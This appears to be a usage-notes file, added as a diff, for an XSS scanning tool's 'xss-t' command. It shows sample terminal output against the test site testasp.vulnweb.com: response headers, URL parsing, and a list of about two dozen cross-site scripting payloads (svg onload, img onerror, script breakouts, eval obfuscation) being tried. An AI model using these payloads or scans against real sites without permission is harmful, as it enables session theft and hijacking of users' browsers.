@@ -1,0 +1,96 @@
+ ________  _______   ________                 ________  ________  ________  ________  ___  _________               ___      ___ ________      
+|\   __  \|\  ___ \ |\   ___ \               |\   __  \|\   __  \|\   __  \|\   __  \|\  \|\___   ___\            |\  \    /  /|\   ____\     
+\ \  \|\  \ \   __/|\ \  \_|\ \  ____________\ \  \|\  \ \  \|\  \ \  \|\ /\ \  \|\ /\ \  \|___ \  \_|____________\ \  \  /  / | \  \___|_    
+ \ \   _  _\ \  \_|/_\ \  \ \\ \|\____________\ \   _  _\ \   __  \ \   __  \ \   __  \ \  \   \ \  \|\____________\ \  \/  / / \ \_____  \   
+  \ \  \\  \\ \  \_|\ \ \  \_\\ \|____________|\ \  \\  \\ \  \ \  \ \  \|\  \ \  \|\  \ \  \   \ \  \|____________|\ \    / /   \|____|\  \  
+   \ \__\\ _\\ \_______\ \_______\              \ \__\\ _\\ \__\ \__\ \_______\ \_______\ \__\   \ \__\              \ \__/ /      ____\_\  \ 
+    \|__|\|__|\|_______|\|_______|               \|__|\|__|\|__|\|__|\|_______|\|_______|\|__|    \|__|               \|__|/      |\_________\
+                                                                                                                                  \|_________|
+------------------------------------------------------------------------------------------------------------------------------------------------------
+this command is 
+
+xss-t
+
+when you input the url it will ask for a payload file, if you do not have one to remember or have
+
+a very specified path for it then just type xss.txt as this is the most defualt wordlist for this script 
+
+the following output will come out on the terminal 
+
+( this part works with golang as a primary source for socket name manipulation)
+
+URL > http://testasp.vulnweb.com/showforum.asp?id=1
+XSS list > xss.txt
+[*] Socket Form -> testasp.vulnweb.com
+[*] Socket Name -> 44.238.29.244
+[*] Regexed URL -> http://testasp.vulnweb.com
+[*] Started At  : 2021-12-21 18:05:32.838428
+────────────────────────────────────────────
+[*] Gathering X-Frame request headers......
+
+[+] Response Status  ->  200 OK
+[+] Date Of Request  ->  Wed, 22 Dec 2021 04:05:40 GMT
+[+] Content-Encoding ->  
+[+] Content-Type     ->  text/html
+[+] Connected-Server ->  Microsoft-IIS/8.5
+[+] X-Frame-Options  ->  
+[+] -> Content-Length -> [3077]
+[+] -> Cache-Control -> [private]
+[+] -> Content-Type -> [text/html]
+[+] -> Server -> [Microsoft-IIS/8.5]
+[+] -> Set-Cookie -> [ASPSESSIONIDCCDACTRD=ICJKAMCBNDJEGMGNDPCFPJEF; path=/]
+[+] -> X-Powered-By -> [ASP.NET]
+[+] -> Date -> [Wed, 22 Dec 2021 04:05:40 GMT]
+
+
+then you will get the following output for parsing the URL with regex 
+
+Scheme        --->  http
+Hostname      --->  testasp.vulnweb.com
+Path in URL   --->  /showforum.asp
+Query Strings --->  id=1
+Fragments     --->  
+map[id:[1]]
+Detected Payloads in file ->  7136
+----------------------------------------------
+[+] Utilizing Defualt xss script -> xss.txt
+
+
+this will the conitnue onto test every single payload
+
+
+[+] Targeting URL -> http://testasp.vulnweb.com/showforum.asp?id=1
+[+] Time Started  -> 2021-12-21 18:05:43.948178
+[~] Testing Payload -> 1 : 'onload=alert(1)><svg/1='
+[~] Testing Payload -> 1 : '>alert(1)</script><script/1='
+[~] Testing Payload -> 1 : */alert(1)</script><script>/*
+[~] Testing Payload -> 1 : */alert(1)">'onload="/*<svg/1='
+[~] Testing Payload -> 1 : `-alert(1)">'onload="`<svg/1='
+[~] Testing Payload -> 1 : "-prompt(8)-"
+[~] Testing Payload -> 1 : '-prompt(8)-'
+[~] Testing Payload -> 1 : ";a=prompt,a()//
+[~] Testing Payload -> 1 : ';a=prompt,a()//
+[~] Testing Payload -> 1 : '-eval("window['pro'%2B'mpt'](8)")-'
+[~] Testing Payload -> 1 : "-eval("window['pro'%2B'mpt'](8)")-"
+[~] Testing Payload -> 1 : "onclick=prompt(8)>"@x.y
+[~] Testing Payload -> 1 : "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+[~] Testing Payload -> 1 : <image/src/onerror=prompt(8)>
+[~] Testing Payload -> 1 : <img/src/onerror=prompt(8)>
+[~] Testing Payload -> 1 : <image src/onerror=prompt(8)>
+[~] Testing Payload -> 1 : <img src/onerror=prompt(8)>
+[~] Testing Payload -> 1 : <image src =q onerror=prompt(8)>
+[~] Testing Payload -> 1 : <img src =q onerror=prompt(8)>
+[~] Testing Payload -> 1 : </scrip</script>t><img src =q onerror=prompt(8)>
+[~] Testing Payload -> 1 : <svg onload=alert(1)>
+[~] Testing Payload -> 1 : "><svg onload=alert(1)//
+[~] Testing Payload -> 1 : "onmouseover=alert(1)//
+
+
+
+this usually will mean that it came back false and does not come back as correct
+
+however if the URL is vulnerable it will tabulate the output in  green as that is how you know the 
+
+url is known and or vulnerable to XSS injection
+
+
